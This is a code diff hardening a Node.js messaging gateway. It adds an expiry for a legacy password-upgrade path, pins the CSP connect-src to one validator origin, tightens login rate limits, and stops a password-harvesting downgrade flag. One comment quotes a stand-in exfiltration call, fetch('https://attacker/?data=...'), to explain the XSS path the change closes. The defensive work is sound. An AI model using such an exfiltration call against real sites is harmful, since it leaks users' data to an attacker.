@@ -69,7 +69,18 @@ const CFG = {
   // 1 matches the default deployment (Caddy in front). Set 0 when the gateway
   // is exposed directly, or 2 when a CDN fronts Caddy.
   trustedProxyHops: Number(process.env.TRUSTED_PROXY_HOPS ?? 1),
+  // When the one-time upgrade path for pre-split accounts closes. Until then a
+  // sign-in for an account that still has a password-based hash may fall back
+  // to sending the password once, so it can be re-stored as an auth secret.
+  // That fallback is the only remaining way a password reaches this server, so
+  // it is not left open indefinitely: after this date those accounts need a
+  // password reset instead. Empty means "no deadline" (upgrades stay possible).
+  legacyAuthUntil: process.env.LEGACY_AUTH_UNTIL ? Date.parse(process.env.LEGACY_AUTH_UNTIL) : null,
 };
+if (CFG.legacyAuthUntil !== null && Number.isNaN(CFG.legacyAuthUntil)) {
+  console.error("LEGACY_AUTH_UNTIL is not a valid date, refusing to start");
+  process.exit(1);
+}
 
 function computeVersion() {
   // Hash the bundle AND the stylesheet so any front-end change bumps the
@@ -105,14 +116,23 @@ const MIME = {
 // their hostnames genuinely aren't known here.
 //
 // So it is only granted when that transport is actually wired up. A deployment
-// without a nym sidecar - the default - gets 'self' and nothing else. Where it
-// is in use, NYM_CONNECT_SRC narrows the wildcard to the specific hosts of a
-// known validator set.
+// without a nym sidecar - the default - gets 'self' and nothing else.
+//
+// Even with nym, `https:` is no longer needed: measuring a real session showed
+// the only https origin the client reaches is the nym API (validator) it was
+// pointed at; everything else it does is websockets to gateways it picks from
+// the topology, whose hostnames belong to third-party operators and genuinely
+// cannot be enumerated here. So https is pinned to the validator and only wss
+// stays broad. That still leaves a websocket-shaped exfiltration path under
+// XSS, but it closes the trivial `fetch('https://attacker/?data=...')` one.
+// NYM_CONNECT_SRC replaces this list outright for deployments using a
+// different validator or a pinned gateway set.
+const NYM_API_ORIGIN = "https://validator.nymtech.net";
 function connectSrc() {
   const base = ["'self'"];
   if (!CFG.nymClientUrl) return base.join(" ");
   const configured = (process.env.NYM_CONNECT_SRC || "").split(/[\s,]+/).map((s) => s.trim()).filter(Boolean);
-  return base.concat(configured.length ? configured : ["https:", "wss:"]).join(" ");
+  return base.concat(configured.length ? configured : [NYM_API_ORIGIN, "wss:"]).join(" ");
 }
 const CSP = [
   "default-src 'self'", "base-uri 'self'", "object-src 'none'", "frame-ancestors 'none'",
@@ -217,7 +237,13 @@ async function main() {
   async function refreshBans() { bannedMbkeys.clear(); for (const k of await store.allBannedMbkeys()) bannedMbkeys.add(k); }
 
   const httpLimit = rateLimiter({ capacity: 60, refillPerSec: 10 });
-  const authLimit = rateLimiter({ capacity: 10, refillPerSec: 0.5 }); // login/register brute-force guard
+  // Shared per-address budget across login, register and admin sign-in. The
+  // refill used to allow 30 attempts a minute indefinitely, which is generous
+  // for credential stuffing spread thinly across many handles (the per-handle
+  // backoff below never sees more than one attempt per account). 12 to burst,
+  // then roughly 9 a minute: still far above what a person typing their own
+  // password needs, including from behind a shared NAT address.
+  const authLimit = rateLimiter({ capacity: 12, refillPerSec: 0.15 });
   // Per-handle backoff on top of the per-IP bucket above. The bucket alone only
   // slows one address down; an attacker spread across many addresses would keep
   // a full allowance per address while pounding a single account. Keyed on the
@@ -227,6 +253,14 @@ async function main() {
   // retry). Guessing is expensive for the attacker regardless: every candidate
   // needs its own 600k-iteration derivation before it can even be submitted.
   const loginLockout = makeLockout({ threshold: 8, baseDelayMs: 2000, maxDelayMs: 15 * 60 * 1000 });
+  // Is the one-time upgrade path still open?
+  //
+  // It exists only to carry pre-split accounts over, and it is the one place
+  // where a password still reaches us. Left open forever it would stay a
+  // standing invitation to downgrade, so it expires: past the deadline the
+  // path is simply gone and the remaining stragglers need a password reset.
+  const legacyAuthOpen = () => !CFG.legacyAuthUntil || Date.now() < CFG.legacyAuthUntil;
+
   // Check a sign-in against whichever scheme this account is on, upgrading it
   // to the new one when an old account proves its password.
   async function verifyAuth(acc, b) {
@@ -237,6 +271,7 @@ async function main() {
     }
     // Pre-split account: the stored hash is over the raw password, so that is
     // the only thing we can check it against.
+    if (!legacyAuthOpen()) return false;
     if (typeof b.password !== "string" || !b.password) return false;
     if (!(await verifyPassword(b.password, acc.pass))) return false;
     if (AUTH_SECRET_RE.test(String(b.authSecret || ""))) {
@@ -245,13 +280,34 @@ async function main() {
     }
     return true;
   }
-  // A failed sign-in that carried no password gets told to retry the old way.
-  // Sent on every such failure, including for handles that do not exist, so it
-  // never doubles as an "this account is old" oracle.
-  const authFailure = (res, b) => {
+  // Tell the client to retry the old way - but only when that is genuinely
+  // true for this account.
+  //
+  // This flag used to go out on every failed sign-in, including for handles
+  // that do not exist. The idea was to avoid an "this account is old" oracle,
+  // but it bought that at too high a price: a malicious or compromised server
+  // could answer every attempt with it and harvest plaintext passwords, which
+  // is exactly the capability the auth/blob split was meant to remove. A
+  // server that can ask for the password can recompute the blob key, and we
+  // are back where we started.
+  //
+  // So the flag is now only set for an account that actually still needs it.
+  // That does leak "this handle exists and has not signed in since the split",
+  // for as long as the path stays open - a much smaller price than handing an
+  // active attacker a downgrade switch. Registration already discloses handle
+  // existence anyway.
+  const authFailure = (res, b, acc) => {
     const body = { error: "wrong handle or password" };
-    if (typeof b.password !== "string") body.retryLegacy = true;
+    const needsUpgrade = acc && acc.auth_ver < 2 && legacyAuthOpen();
+    if (needsUpgrade && typeof b.password !== "string") body.retryLegacy = true;
     return json(res, 401, body);
+  };
+  // Turn a body-reading failure into the right status: an oversized body is a
+  // 413 the caller can act on, not the generic 400 that used to hide it (or,
+  // before readBody stopped dropping the connection, a bare 502 from the proxy).
+  const badBody = (res, e) => {
+    if (e && e.code === "E_TOO_LARGE") { res.setHeader("Connection", "close"); return json(res, 413, { error: "payload too large" }); }
+    return json(res, 400, { error: "bad request" });
   };
   // Reject an attempt that is currently backed off. Returns true when it has
   // already answered the request.
@@ -354,7 +410,7 @@ async function main() {
           const token = crypto.randomBytes(32).toString("hex");
           await store.createSession(token, username, CFG.sessionTtlMs);
           return json(res, 200, { token, username });
-        } catch (e) { return json(res, 400, { error: "bad request" }); }
+        } catch (e) { return badBody(res, e); }
       }
       if (url.pathname === "/api/account/login" && req.method === "POST") {
         if (!authLimit(ip)) return json(res, 429, { error: "too many attempts" });
@@ -366,7 +422,7 @@ async function main() {
           const acc = await store.getAccount(username);
           if (!acc || !(await verifyAuth(acc, b))) {
             loginLockout.fail(username);
-            return authFailure(res, b);
+            return authFailure(res, b, acc);
           }
           if (acc.banned) return json(res, 403, { error: "account suspended" });
           loginLockout.succeed(username);
@@ -374,7 +430,7 @@ async function main() {
           const token = crypto.randomBytes(32).toString("hex");
           await store.createSession(token, username, CFG.sessionTtlMs);
           return json(res, 200, { token, username });
-        } catch (e) { return json(res, 400, { error: "bad request" }); }
+        } catch (e) { return badBody(res, e); }
       }
       if (url.pathname === "/api/account/logout" && req.method === "POST") {
         try { const b = JSON.parse(await readBody(req, CFG.maxBodyBytes)); const t = asToken(b.token); if (t) await store.deleteSession(t); } catch { /* */ }
@@ -409,7 +465,7 @@ async function main() {
           const mbk = await store.clearOtherDevices(username, b.deviceId);
           for (const k of mbk) { const set = mbkeySockets.get(k); if (set) for (const ws of set) { try { ws.close(4005, "signed out elsewhere"); } catch { /* */ } } }
           return json(res, 200, { ok: true, removed: mbk.length });
-        } catch (e) { return json(res, 400, { error: "bad request" }); }
+        } catch (e) { return badBody(res, e); }
       }
       // Public key material for a handle. Signed-in callers only: unauthenticated
       // this was a user directory. It answers 200-with-bundle for a handle that
@@ -555,7 +611,7 @@ async function main() {
             if (blob && !/^[A-Za-z0-9+/=]+$/.test(blob)) return json(res, 400, { error: "bad blob" });
             await store.setBlob(username, blob);
             return json(res, 200, { ok: true });
-          } catch (e) { return json(res, 400, { error: "bad request" }); }
+          } catch (e) { return badBody(res, e); }
         }
       }
 
@@ -572,7 +628,7 @@ async function main() {
             const acc = await store.getAccount(username);
             if (!acc || !(await verifyAuth(acc, b))) {
               loginLockout.fail(username);
-              return authFailure(res, b);
+              return authFailure(res, b, acc);
             }
             if (acc.banned) return json(res, 403, { error: "account suspended" });
             if (!acc.is_admin) return json(res, 403, { error: "not an admin account" });
@@ -581,7 +637,7 @@ async function main() {
             await store.createSession(token, username, CFG.sessionTtlMs);
             elog.add("info", "admin signed in", username);
             return json(res, 200, { token, username });
-          } catch { return json(res, 400, { error: "bad request" }); }
+          } catch (e) { return badBody(res, e); }
         }
         if (!(await requireAdmin(req, res))) return;
         if (url.pathname === "/api/admin/status" && req.method === "GET") {
